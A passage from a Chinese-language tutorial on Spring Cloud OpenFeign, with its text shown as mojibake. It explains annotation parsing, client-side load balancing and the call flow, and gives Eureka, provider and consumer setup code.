<p>åœ¨åŸç”Ÿçš„ Feign ä¸­ï¼Œå®ƒåªæ”¯æŒè‡ªèº«å®šä¹‰çš„ä¸€å¥—æ³¨è§£ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šé™åˆ¶äº†å…¶é€šç”¨æ€§å’Œå¼€å‘è€…çš„ä½¿ç”¨ä¹ æƒ¯ã€‚è€Œ Spring Cloud å¯¹ Feign çš„Contractè¿›è¡Œäº†å·§å¦™æ‰©å±•ï¼Œä½¿å…¶èƒ½å¤Ÿå…¼å®¹ Spring MVC çš„æ³¨è§£ï¼Œå¦‚@RequestMappingã€@GetMappingã€@PostMappingã€@PathVariableã€@RequestParamç­‰ã€‚è¿™ä¸€æ‰©å±•æ„ä¹‰é‡å¤§ï¼Œå®ƒå¤§å¤§é™ä½äº†å¼€å‘è€…çš„å­¦ä¹ æˆæœ¬ï¼Œå› ä¸ºå¯¹äºç†Ÿæ‚‰ Spring MVC å¼€å‘çš„å¼€å‘è€…æ¥è¯´ï¼Œæ— éœ€é‡æ–°å­¦ä¹ ä¸€å¥—å…¨æ–°çš„æ³¨è§£ä½“ç³»ï¼Œå°±å¯ä»¥ç›´æ¥åœ¨ Feign æ¥å£ä¸­ä½¿ç”¨ä»–ä»¬ç†Ÿæ‚‰çš„ Spring MVC æ³¨è§£ï¼Œå®ç° â€œæ³¨è§£å¤ç”¨â€ã€‚</p>
<p>ä¾‹å¦‚ï¼Œåœ¨ä¸€ä¸ªåŸºäº Spring Cloud çš„å¾®æœåŠ¡é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åƒè¿™æ ·å®šä¹‰ä¸€ä¸ª Feign æ¥å£ï¼š</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@FeignClient</span>(name = <span class="hljs-string">"product-service"</span>)
public interface ProductFeignClient {
    <span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/product/{id}"</span>)
    Product <span class="hljs-built_in">getProductById</span>(<span class="hljs-variable">@PathVariable</span>(<span class="hljs-string">"id"</span>) Long id);

    <span class="hljs-variable">@PostMapping</span>(<span class="hljs-string">"/product"</span>)
    Product <span class="hljs-built_in">saveProduct</span>(<span class="hljs-variable">@RequestBody</span> Product product);
}
</code></pre>
<p>åœ¨è¿™ä¸ªæ¥å£ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†@GetMappingå’Œ@PostMappingç­‰ Spring MVC æ³¨è§£æ¥å®šä¹‰ HTTP è¯·æ±‚çš„æ–¹æ³•å’Œè·¯å¾„ï¼Œ@PathVariableå’Œ@RequestBodyæ³¨è§£æ¥å¤„ç†è¯·æ±‚å‚æ•°ã€‚Contractä¼šè§£æè¿™äº›æ³¨è§£ï¼Œç”Ÿæˆå¯¹åº”çš„ HTTP è¯·æ±‚å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬è¯·æ±‚çš„ URLã€HTTP æ–¹æ³•ã€å‚æ•°ç­‰ä¿¡æ¯ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ Spring MVC æ³¨è§£çš„å¼ºå¤§åŠŸèƒ½ï¼Œæ›´åŠ çµæ´»ã€æ–¹ä¾¿åœ°å®šä¹‰ Feign çš„è¿œç¨‹è°ƒç”¨æ¥å£ï¼Œæé«˜å¼€å‘æ•ˆç‡å’Œä»£ç çš„å¯è¯»æ€§ã€‚</p>
<h3 data-id="heading-9"><strong>2.2.4 LoadBalancerï¼šè´Ÿè½½å‡è¡¡çš„ â€œè°ƒåº¦å‘˜â€</strong></h3>
<p>åœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œä¸€ä¸ªæœåŠ¡é€šå¸¸ä¼šæœ‰å¤šä¸ªå®ä¾‹åŒæ—¶è¿è¡Œï¼Œä»¥æé«˜ç³»ç»Ÿçš„å¯ç”¨æ€§å’Œæ€§èƒ½ã€‚LoadBalancerç»„ä»¶åœ¨ Feign ä¸­å°±æ‰®æ¼”ç€è´Ÿè½½å‡è¡¡ â€œè°ƒåº¦å‘˜â€ çš„è§’è‰²ï¼Œå®ƒç»“åˆÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269436125%26content_type%3DArticle%26match_order%3D1%26q%3DEureka%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269436125&amp;content_type=Article&amp;match_order=1&amp;q=Eureka&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Eureka</a>ã€Nacos ç­‰æœåŠ¡æ³¨å†Œä¸­å¿ƒæä¾›çš„æœåŠ¡å®ä¾‹åˆ—è¡¨ï¼Œå®ç°å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ï¼Œç¡®ä¿è¯·æ±‚èƒ½å¤Ÿå‡åŒ€åœ°åˆ†å‘åˆ°å„ä¸ªæœåŠ¡å®ä¾‹ä¸Šã€‚</p>
<p>Feign é»˜è®¤é›†æˆäº†Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fzhida.zhihu.com%2Fsearch%3Fcontent_id%3D269436125%26content_type%3DArticle%26match_order%3D1%26q%3DRibbon%26zhida_source%3Dentity" target="_blank" title="https://zhida.zhihu.com/search?content_id=269436125&amp;content_type=Article&amp;match_order=1&amp;q=Ribbon&amp;zhida_source=entity" ref="nofollow noopener noreferrer">Ribbon</a>Â æˆ– Spring Cloud LoadBalancer ä½œä¸ºè´Ÿè½½å‡è¡¡å™¨ã€‚ä»¥ Ribbon ä¸ºä¾‹ï¼Œå½“ Feign å‘èµ·ä¸€ä¸ªè¿œç¨‹è°ƒç”¨æ—¶ï¼ŒRibbon ä¼šä»æœåŠ¡æ³¨å†Œä¸­å¿ƒè·å–ç›®æ ‡æœåŠ¡çš„æ‰€æœ‰å®ä¾‹åˆ—è¡¨ï¼Œç„¶åæ ¹æ®é¢„è®¾çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼ˆå¦‚è½®è¯¢ã€éšæœºã€æƒé‡ç­‰ï¼‰ï¼Œä»è¿™äº›å®ä¾‹ä¸­é€‰æ‹©ä¸€ä¸ªæœ€ä¼˜çš„å®ä¾‹æ¥å‘é€ HTTP è¯·æ±‚ã€‚</p>
<p>æ¯”å¦‚ï¼Œåœ¨ä¸€ä¸ªç”µå•†ç³»ç»Ÿä¸­ï¼Œå•†å“æœåŠ¡å¯èƒ½éƒ¨ç½²äº†å¤šä¸ªå®ä¾‹ï¼Œå½“è®¢å•æœåŠ¡éœ€è¦è°ƒç”¨å•†å“æœåŠ¡è·å–å•†å“è¯¦æƒ…æ—¶ï¼ŒFeign ä¼šé€šè¿‡ Ribbon ä»å•†å“æœåŠ¡çš„å®ä¾‹åˆ—è¡¨ä¸­é€‰æ‹©ä¸€ä¸ªå®ä¾‹å‘é€è¯·æ±‚ã€‚å¦‚æœé‡‡ç”¨è½®è¯¢ç­–ç•¥ï¼ŒRibbon ä¼šæŒ‰ç…§é¡ºåºä¾æ¬¡é€‰æ‹©æ¯ä¸ªå®ä¾‹ï¼Œä¿è¯æ¯ä¸ªå®ä¾‹éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼›å¦‚æœé‡‡ç”¨éšæœºç­–ç•¥ï¼ŒRibbon ä¼šéšæœºé€‰æ‹©ä¸€ä¸ªå®ä¾‹ï¼Œå¢åŠ äº†è¯·æ±‚åˆ†é…çš„éšæœºæ€§ï¼›å¦‚æœé‡‡ç”¨æƒé‡ç­–ç•¥ï¼ŒRibbon ä¼šæ ¹æ®æ¯ä¸ªå®ä¾‹çš„æ€§èƒ½ã€è´Ÿè½½ç­‰å› ç´ åˆ†é…ä¸åŒçš„æƒé‡ï¼Œæ€§èƒ½å¥½ã€è´Ÿè½½ä½çš„å®ä¾‹ä¼šè¢«æ›´å¤šåœ°é€‰ä¸­ï¼Œä»è€Œå®ç°æ›´åˆç†çš„è´Ÿè½½å‡è¡¡ã€‚</p>
<p>é€šè¿‡è¿™ç§å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡æœºåˆ¶ï¼ŒFeign èƒ½å¤Ÿæœ‰æ•ˆé¿å…æŸä¸ªæœåŠ¡å®ä¾‹å› è´Ÿè½½è¿‡é«˜è€Œå¯¼è‡´æ€§èƒ½ä¸‹é™æˆ–å´©æºƒï¼Œæé«˜äº†æ•´ä¸ªå¾®æœåŠ¡æ¶æ„çš„å¯ç”¨æ€§å’Œç¨³å®šæ€§ã€‚åŒæ—¶ï¼Œç»“åˆæœåŠ¡æ³¨å†Œä¸­å¿ƒçš„åŠ¨æ€å‘ç°åŠŸèƒ½ï¼Œå½“æœ‰æ–°çš„æœåŠ¡å®ä¾‹ä¸Šçº¿æˆ–ä¸‹çº¿æ—¶ï¼ŒRibbon èƒ½å¤ŸåŠæ—¶æ›´æ–°å®ä¾‹åˆ—è¡¨ï¼Œä¿è¯è´Ÿè½½å‡è¡¡çš„å‡†ç¡®æ€§å’Œæœ‰æ•ˆæ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7765e0a77ff84834af2b948dfca44f5a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=GBgXZZz0wKzqUSY8NrWaDVTIVCs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10"><strong>2.3 å®Œæ•´è°ƒç”¨æµç¨‹ï¼šä»æ¥å£è°ƒç”¨åˆ°å“åº”è¿”å›çš„ â€œå…¨é“¾è·¯â€</strong></h3>
<p>äº†è§£äº† Feign çš„æ ¸å¿ƒåŸç†å’Œäº”å¤§æ ¸å¿ƒç»„ä»¶åï¼Œæˆ‘ä»¬æ¥æ¢³ç†ä¸€ä¸‹ Feign è°ƒç”¨çš„å®Œæ•´æµç¨‹ï¼Œçœ‹çœ‹è¿™äº›ç»„ä»¶æ˜¯å¦‚ä½•ååŒå·¥ä½œï¼Œå®ç°ä»æ¥å£è°ƒç”¨åˆ°å“åº”è¿”å›çš„ç¥å¥‡ä¹‹æ—…çš„ã€‚</p>
<p><strong>1. æ¥å£æ–¹æ³•è°ƒç”¨</strong>ï¼šåœ¨è°ƒç”¨æ–¹çš„ä»£ç ä¸­ï¼Œé€šè¿‡@Autowiredæ³¨å…¥ Feign æ¥å£ï¼Œå¹¶è°ƒç”¨å…¶æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> UserFeignClient userFeignClient;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getUserInfo</span><span class="hljs-params">()</span> {
    <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> userFeignClient.getUserById(<span class="hljs-number">1L</span>);
    <span class="hljs-comment">// å¤„ç†ç”¨æˆ·ä¿¡æ¯</span>
}
</code></pre>
<p><strong>2. ä»£ç†ç±»æ‹¦æˆªè¯·æ±‚</strong>ï¼šç”±äºæ³¨å…¥çš„ Feign æ¥å£æ˜¯ä¸€ä¸ªåŠ¨æ€ä»£ç†å¯¹è±¡ï¼Œè°ƒç”¨æ–¹æ³•æ—¶ï¼Œä»£ç†ç±»ï¼ˆç”±FeignInvocationHandleré©±åŠ¨ï¼‰ä¼šæ‹¦æˆªè¿™ä¸ªè¯·æ±‚ã€‚</p>
<p><strong>3. Contract è§£ææ³¨è§£ç”Ÿæˆè¯·æ±‚æ¨¡æ¿</strong>ï¼šContractç»„ä»¶å¼€å§‹å·¥ä½œï¼Œå®ƒè§£æ Feign æ¥å£æ–¹æ³•ä¸Šçš„æ³¨è§£ï¼ˆå¦‚@FeignClientã€@GetMappingã€@PathVariableç­‰ï¼‰ï¼Œæå–æœåŠ¡åã€è¯·æ±‚ URLã€HTTP æ–¹æ³•ç­‰å…ƒæ•°æ®ï¼Œç”Ÿæˆä¸€ä¸ªRequestTemplateï¼Œè¿™ä¸ªæ¨¡æ¿åŒ…å«äº† HTTP è¯·æ±‚çš„åŸºæœ¬æ¡†æ¶ã€‚</p>
<p><strong>4. Encoder åºåˆ—åŒ–å‚æ•°</strong>ï¼šå¦‚æœæ¥å£æ–¹æ³•æœ‰å‚æ•°ï¼ŒEncoderä¼šå°†è¿™äº›å‚æ•°åºåˆ—åŒ–ä¸º HTTP è¯·æ±‚ä½“èƒ½å¤Ÿæ¥å—çš„æ ¼å¼ï¼Œé€šå¸¸æ˜¯ JSON æ ¼å¼ã€‚ä¾‹å¦‚ï¼Œå°†ä¸€ä¸ªUserå¯¹è±¡åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œå¡«å……åˆ°RequestTemplateçš„è¯·æ±‚ä½“ä¸­ã€‚</p>
<p><strong>5. LoadBalancer é€‰æ‹©æœåŠ¡å®ä¾‹</strong>ï¼šLoadBalanceræ ¹æ®æœåŠ¡æ³¨å†Œä¸­å¿ƒæä¾›çš„æœåŠ¡å®ä¾‹åˆ—è¡¨ï¼Œç»“åˆè´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œä»å¤šä¸ªæœåŠ¡å®ä¾‹ä¸­é€‰æ‹©ä¸€ä¸ªåˆé€‚çš„å®ä¾‹ã€‚æ¯”å¦‚ï¼Œä½¿ç”¨ Ribbon çš„è½®è¯¢ç­–ç•¥é€‰æ‹©ä¸€ä¸ªuser-serviceçš„å®ä¾‹ã€‚</p>
<p><strong>6. Client å‘é€ HTTP è¯·æ±‚</strong>ï¼šClientç»„ä»¶ï¼ˆå¦‚é»˜è®¤çš„HttpURLConnectionæˆ–é…ç½®çš„OkHttpã€Apache HttpClientï¼‰æ ¹æ®RequestTemplateç”Ÿæˆçš„è¯·æ±‚ä¿¡æ¯ï¼Œå‘é€‰æ‹©çš„æœåŠ¡å®ä¾‹å‘é€ HTTP è¯·æ±‚ã€‚</p>
<p><strong>7. æœåŠ¡ç«¯å¤„ç†å¹¶è¿”å›å“åº”</strong>ï¼šç›®æ ‡æœåŠ¡å®ä¾‹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œè¿›è¡Œä¸šåŠ¡å¤„ç†ï¼Œç„¶åè¿”å› HTTP å“åº”ã€‚</p>
<p><strong>8. Decoder ååºåˆ—åŒ–å“åº”</strong>ï¼šDecoderå°†æœåŠ¡ç«¯è¿”å›çš„ HTTP å“åº”ä½“ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ï¼Œæ¯”å¦‚å°† JSON æ ¼å¼çš„å“åº”æ•°æ®è½¬æ¢ä¸ºUserå¯¹è±¡ã€‚</p>
<p><strong>9. ç»“æœè¿”å›ç»™è°ƒç”¨æ–¹</strong>ï¼šæœ€åï¼Œååºåˆ—åŒ–åçš„ç»“æœé€šè¿‡ä»£ç†ç±»è¿”å›ç»™è°ƒç”¨æ–¹çš„ä»£ç ï¼Œè°ƒç”¨æ–¹å°±å¯ä»¥è·å–åˆ°è¿œç¨‹æœåŠ¡è°ƒç”¨çš„ç»“æœï¼Œå¹¶è¿›è¡Œåç»­å¤„ç†ã€‚</p>
<p>é€šè¿‡è¿™ä¸€å®Œæ•´çš„è°ƒç”¨æµç¨‹ï¼ŒFeign å®ç°äº†å°†æœ¬åœ°æ¥å£æ–¹æ³•è°ƒç”¨è½¬åŒ–ä¸ºè¿œç¨‹ HTTP è¯·æ±‚çš„è¿‡ç¨‹ï¼Œå„ä¸ªç»„ä»¶ä¹‹é—´ç´§å¯†é…åˆï¼ŒååŒå·¥ä½œï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ç§ç®€æ´ã€é«˜æ•ˆçš„å¾®æœåŠ¡è¿œç¨‹è°ƒç”¨è§£å†³æ–¹æ¡ˆã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de03c76abd2b4ff0bc4a6148969d9f42~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=nXOq53G1nVczx1l%2Fni4yQKAJThg%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-11"><strong>ä¸‰ã€å®æˆ˜æ•™ç¨‹ï¼šä»é›¶æ­å»º Feign è¿œç¨‹è°ƒç”¨ï¼ˆé™„ä»£ç ç¤ºä¾‹ï¼‰</strong></h2>
<h3 data-id="heading-12"><strong>3.1 ç¯å¢ƒå‡†å¤‡ï¼šæœåŠ¡æ³¨å†Œä¸­å¿ƒ + æœåŠ¡æä¾›è€… + æ¶ˆè´¹è€…</strong></h3>
<p>åœ¨å¼€å§‹ä½¿ç”¨ Feign è¿›è¡Œè¿œç¨‹è°ƒç”¨ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºä¸€ä¸ªåŸºç¡€çš„å¾®æœåŠ¡ç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒå°±åƒæ˜¯ä¸€ä¸ªæ­å»ºå¥½çš„èˆå°ï¼Œä¸º Feign çš„ç²¾å½©è¡¨æ¼”åšå¥½å‡†å¤‡ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ Eurekaï¼ˆä¹Ÿå¯ä»¥ä½¿ç”¨ Nacos ç­‰å…¶ä»–æœåŠ¡æ³¨å†Œä¸­å¿ƒï¼‰ä½œä¸ºæœåŠ¡æ³¨å†Œä¸å‘ç°çš„ç»„ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªæœåŠ¡æä¾›è€…å’Œä¸€ä¸ªæœåŠ¡æ¶ˆè´¹è€…ï¼Œé€šè¿‡ Feign å®ç°æ¶ˆè´¹è€…å¯¹æä¾›è€…çš„è¿œç¨‹è°ƒç”¨ã€‚</p>
<p>é¦–å…ˆï¼Œå¯åŠ¨ Eureka æœåŠ¡æ³¨å†Œä¸­å¿ƒã€‚åœ¨pom.xmlæ–‡ä»¶ä¸­æ·»åŠ  Eureka Server çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>ç„¶ååœ¨ Spring Boot ä¸»ç±»ä¸Šæ·»åŠ @EnableEurekaServeræ³¨è§£ï¼Œå¼€å¯ Eureka Server åŠŸèƒ½ã€‚é…ç½®application.ymlæ–‡ä»¶ï¼Œè®¾ç½®æœåŠ¡ç«¯å£ã€æœåŠ¡åä»¥åŠæ³¨å†Œä¸­å¿ƒåœ°å€ç­‰ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8761</span>

<span class="hljs-attr">eureka:</span>
  <span class="hljs-attr">instance:</span>
    <span class="hljs-attr">hostname:</span> <span class="hljs-string">localhost</span>
  <span class="hljs-attr">client:</span>
    <span class="hljs-attr">register-with-eureka:</span> <span class="hljs-literal">false</span>
    <span class="hljs-attr">fetch-registry:</span> <span class="hljs-literal">false</span>
    <span class="hljs-attr">service-url:</span>
      <span class="hljs-attr">defaultZone:</span> <span class="hljs-string">http://${eureka.instance.hostname}:${server.port}/eureka/</span>
</code></pre>
<p>å¯åŠ¨ Eureka Server åï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—®<a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttp%253A%2F%2Flocalhost%253A8761%2F" target="_blank" title="https://link.zhihu.com/?target=http%3A//localhost%3A8761/" ref="nofollow noopener noreferrer">http://localhost:8761/</a>ï¼Œçœ‹åˆ° Eureka çš„ç®¡ç†ç•Œé¢ï¼Œè¿™è¡¨æ˜æœåŠ¡æ³¨å†Œä¸­å¿ƒå·²ç»å‡†å¤‡å°±ç»ªã€‚</p>
<p>æ¥ç€ï¼Œåˆ›å»ºæœåŠ¡æä¾›è€… ServiceAã€‚åœ¨pom.xmlæ–‡ä»¶ä¸­æ·»åŠ  Eureka Client å’Œ Spring Web çš„ä¾èµ–ï¼Œç”¨äºæ³¨å†ŒæœåŠ¡åˆ° Eureka å’Œæä¾› HTTP æ¥å£ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>åœ¨ Spring Boot ä¸»ç±»ä¸Šæ·»åŠ @EnableEurekaClientæ³¨è§£ï¼Œè¡¨æ˜è¿™æ˜¯ä¸€ä¸ª Eureka å®¢æˆ·ç«¯ï¼Œä¼šå°†è‡ªèº«æ³¨å†Œåˆ° Eureka Server ä¸Šã€‚åˆ›å»ºä¸€ä¸ª Controllerï¼Œæä¾›ä¸€ä¸ªç®€å•çš„æ¥å£ï¼Œæ¯”å¦‚è·å–ç”¨æˆ·ä¿¡æ¯çš„æ¥å£/user/{id}ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.GetMapping;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.PathVariable;
<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RestController;

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {

    <span class="hljs-meta">@GetMapping(<span class="hljs-string">"/user/{id}"</span>)</span>
    <span class="hljs-keyword">public</span> User getUserById(<span class="hljs-meta">@PathVariable</span> <span class="hljs-built_in">Long</span> id) {
        <span class="hljs-comment">// è¿™é‡Œå¯ä»¥ä»æ•°æ®åº“æˆ–å…¶ä»–æ•°æ®æºè·å–ç”¨æˆ·ä¿¡æ¯</span>
        User user = new User();
        user.setId(id);
        user.setName(<span class="hljs-string">"å¼ ä¸‰"</span>);
        user.setAge(<span class="hljs-number">20</span>);
        <span class="hljs-keyword">return</span> user;
    }
}
</code></pre>
<p>å…¶ä¸­Userç±»æ˜¯ä¸€ä¸ªç®€å•çš„ Java Beanï¼ŒåŒ…å«idã€nameã€ageç­‰å±æ€§åŠå¯¹åº”çš„ Getter å’Œ Setter æ–¹æ³•ã€‚</p>
<p>æœ€åï¼Œåˆ›å»ºæœåŠ¡æ¶ˆè´¹è€… ServiceBã€‚åœ¨pom.xmlæ–‡ä»¶ä¸­é™¤äº†æ·»åŠ  Eureka Client å’Œ Spring Web çš„ä¾èµ–å¤–ï¼Œè¿˜éœ€è¦æ·»åŠ  Feign çš„ä¾èµ–ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>è‡³æ­¤ï¼ŒåŸºç¡€çš„å¾®æœåŠ¡ç¯å¢ƒæ­å»ºå®Œæˆï¼ŒæœåŠ¡æ³¨å†Œä¸­å¿ƒ Eureka å·²ç»å¯åŠ¨ï¼ŒæœåŠ¡æä¾›è€… ServiceA å‡†å¤‡å¥½æä¾›æ¥å£ï¼ŒæœåŠ¡æ¶ˆè´¹è€… ServiceB å¼•å…¥äº† Feign ä¾èµ–ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ä½¿ç”¨ Feign å®ç°è¿œç¨‹è°ƒç”¨äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76477d6cefc248279cee449a7e4a7019~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We5aWH5bCP5rGk5ZyG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771228108&amp;x-signature=Q%2BoqLZvu4MGhIBnLnxdoXAaaxO0%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13"><strong>3.2 ä¸‰æ­¥å®ç° Feign è°ƒç”¨ï¼šæ³¨è§£ + æ¥å£ + ä¸šåŠ¡è°ƒç”¨</strong></h3>
<p>åœ¨å®Œæˆç¯å¢ƒå‡†å¤‡åï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ä½¿ç”¨ Feign å®ç°è¿œç¨‹è°ƒç”¨äº†ã€‚æ•´ä¸ªè¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä¸‰æ­¥ï¼Œé€šè¿‡æ·»åŠ  Feign ä¾èµ–å¹¶å¯ç”¨æ³¨è§£ã€ç¼–å†™ Feign å®¢æˆ·ç«¯æ¥å£ä»¥åŠåœ¨ä¸šåŠ¡å±‚æ³¨å…¥å¹¶è°ƒç”¨è¿™ä¸‰ä¸ªå…³é”®æ­¥éª¤ï¼Œå°±èƒ½è½»æ¾å®ç° â€œæœ¬åœ°æ–¹æ³•å¼â€ çš„è¿œç¨‹è°ƒç”¨ã€‚</p>
<h3 data-id="heading-14"><strong>3.2.1 æ­¥éª¤ 1ï¼šæ·»åŠ  Feign ä¾èµ–å¹¶å¯ç”¨æ³¨è§£</strong></h3>
<p>åœ¨ ServiceB çš„pom.xmlæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ·»åŠ äº†spring-cloud-starter-openfeignä¾èµ–ï¼Œè¿™æ˜¯ä½¿ç”¨ Feign çš„åŸºç¡€ã€‚è¿™ä¸ªä¾èµ–å°±åƒæ˜¯ç»™ ServiceB è£…ä¸Šäº†ä¸€æŠŠ â€œç¥å¥‡é’¥åŒ™â€ï¼Œè®©å®ƒå…·å¤‡äº†ä½¿ç”¨ Feign çš„èƒ½åŠ›ã€‚</p>
